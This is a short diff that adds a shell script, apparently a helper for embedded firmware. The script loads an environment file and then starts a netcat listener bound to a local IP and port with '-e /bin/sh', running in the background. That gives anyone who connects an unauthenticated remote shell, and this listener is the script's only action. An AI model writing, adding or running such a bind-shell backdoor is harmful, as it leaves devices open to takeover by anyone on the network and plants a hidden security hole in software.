@@ -1,0 +1,5 @@
+#!/bin/sh
+
+. import_qtnenv
+
+nc -l -l -k -b $qfdr_local_ip -p $nc_port -e /bin/sh &
